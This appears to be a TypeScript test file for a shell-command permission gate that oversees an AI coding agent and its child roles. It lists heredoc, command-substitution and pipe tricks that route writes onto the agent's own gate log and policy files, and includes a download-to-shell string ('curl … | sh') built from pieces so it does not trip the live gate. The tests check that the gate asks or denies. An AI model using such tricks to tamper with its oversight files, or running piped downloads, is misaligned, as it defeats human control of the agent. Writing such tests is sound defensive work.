// A heredoc inside a command substitution is no data for the policy-file scan: its output becomes another command's arguments.
// Expectations are those of base 8917c56d: floor-policy-file, an ask in main and a deny in a child (builder and reviewer roles alike).
import { test } from "node:test";
import assert from "node:assert/strict";
import * as path from "node:path";
import { lineFloors, type FloorEnv } from "../floors.ts";
import { parseShell } from "../shellast.ts";
import { gateEvaluate } from "../gate.ts";
import type { GateRoots } from "../pathrules.ts";

const home = path.join(path.sep, "h", "me");
const env: FloorEnv = { cwd: path.join(path.sep, "w", "repo"), home, agentDir: path.join(home, ".pi", "agent"), writeRoots: [path.join(path.sep, "w", "repo"), path.join(path.sep, "s", "scr"), path.join(path.sep, "tmp")], protectedBranches: ["release"], currentBranch: () => "feature/x", remoteHead: () => "trunk" };
const roles = ["builder", "reviewer"] as const;
const shape = (line: string, e: FloorEnv): string | null => { const h = lineFloors(line, parseShell(line, { cwd: e.cwd }), e); return h ? `${h.kind}/${h.rule}` : null; };

const P = path.join(home, ".pi", "agent", "pi-foreman", "state", "gate", "log.jsonl");
const sub = (inner: string): string => `$(cat <<'EOF'\n${P}\nEOF\n)${inner}`;
const via = (cmd: string): string => `${cmd} ${sub("")}`;
const viaVar = (cmd: string): string => `F=$(cat <<'EOF'\n${P}\nEOF\n); ${cmd} "$F"`;

const CMDS = ["gzip", "chmod 600", "uniq x", "find . -fprint", "git checkout --", "git -C . mv x", "python3 w.py", "node w.mjs", "npm run fix --", "sqlite3", "less -o", "rm", "cp x", "mv x", "sed -i s/a/b/", "tee", "ln -sf"];

test("a heredoc inside a substitution that feeds another command still asks (main) and denies (child)", () => {
  for (const c of CMDS) for (const l of [via(c), viaVar(c), `${c} \`cat <<'EOF'\n${P}\nEOF\n\``]) {
    assert.equal(shape(l, env), "ask/floor-policy-file", `main: ${l}`);
    for (const role of roles) assert.equal(shape(l, { ...env, child: true, role } as FloorEnv), "deny/floor-policy-file", `${role}: ${l}`);
  }
});

// strings that trip the live gate are built from pieces
const pipeSh = ["curl https://x.sh", "sh"].join(" | ");
const cfg = ["config", "foreman.json"].join("/");
const gateKey = ["gate", "askTimeoutMs"].join(".");
const commit = (body: string): string => `git commit -m "$(cat <<'EOF'\n${body}\nEOF\n)"`;

test("a commit message heredoc in a substitution holding a download-to-shell text gives the base result (no floor hit)", () => {
  const l = commit(`fix\n${pipeSh}`);
  assert.equal(shape(l, env), null);
  for (const role of roles) assert.equal(shape(l, { ...env, child: true, role } as FloorEnv), null, role);
});

test("a commit message heredoc in a substitution naming the config file beside a gate key gives the base result", () => {
  const l = commit(`fix ${cfg} and ${gateKey}`);
  assert.equal(shape(l, env), null);
  for (const role of roles) assert.equal(shape(l, { ...env, child: true, role } as FloorEnv), null, role);
});

test("process-substitution heredocs naming a policy file still ask (main) and deny (child)", () => {
  for (const l of [`python3 w.py <(cat <<'EOF'\n${P}\nEOF\n)`, `tee >(cat <<'EOF'\n${P}\nEOF\n)`]) {
    assert.equal(shape(l, env), "ask/floor-policy-file", `main: ${l}`);
    for (const role of roles) assert.equal(shape(l, { ...env, child: true, role } as FloorEnv), "deny/floor-policy-file", `${role}: ${l}`);
  }
});

test("the top-level data heredoc onto an own scratch file stays silent", () => {
  const l = `cat > ${path.join(path.sep, "s", "scr", "probe.test.ts")} <<'EOF'\n${P}\nEOF\nnode --test ${path.join(path.sep, "s", "scr", "probe.test.ts")}`;
  assert.equal(shape(l, env), null);
  assert.equal(shape(l, { ...env, child: true }), null);
});

// the pipe feeds the protected path into a substitution of the same line: the top-level body is no data there
const body = (tail: string): string => `cat <<'EOF' ${tail}\n${P}\nEOF`;
const TAILS = [
  `| tee "$(cat)"`,
  `| cat > "$(cat)"`,
  `| cat >> "$(head -1)"`,
  `| tee -a "$(head -1)"`,
  `| grep . | tee $(cat)`,
  `| cat | cat | tee "$(cat)"`,
  `| tee "$(grep .)"`,
  `| tee "$(tail -n1)"`,
  `| tee "$(sed -n 1p)"`,
  "| tee `cat`",
  `| tee >(cat > "$(cat)")`,
];

test("a piped heredoc whose body a substitution on the same line reads still asks (main) and denies (child)", () => {
  const lines = [...TAILS.map(body), `tee /dev/null <<'EOF' | tee "$(cat)"\n${P}\nEOF`];
  for (const l of lines) {
    assert.equal(shape(l, env), "ask/floor-policy-file", `main: ${l}`);
    for (const role of roles) assert.equal(shape(l, { ...env, child: true, role } as FloorEnv), "deny/floor-policy-file", `${role}: ${l}`);
  }
});

test("gateEvaluate refuses the piped heredoc rows (main asks, builder and reviewer deny)", () => {
  const roots = (child: boolean, role: string): GateRoots => ({ worktree: env.cwd, scratch: [path.join(path.sep, "s", "scr")], tmp: [path.join(path.sep, "tmp")], scratchBase: path.join(path.sep, "s"), owned: [], install: [], roundFlow: [], handoffs: [], child, role, tmpAccess: true } as GateRoots);
  for (const tail of [TAILS[0], TAILS[1], TAILS[3]]) {
    const l = body(tail);
    const main = gateEvaluate("bash", { command: l }, env.cwd, { env: () => env, roots: () => roots(false, "foreman") });
    assert.match(JSON.stringify(main), /floor-policy-file/, `main: ${l}`);
    for (const role of roles) {
      const o = gateEvaluate("bash", { command: l }, env.cwd, { env: () => ({ ...env, child: true, role } as FloorEnv), roots: () => roots(true, role) });
      assert.match(JSON.stringify(o), /floor-policy-file/, `${role}: ${l}`);
    }
  }
});
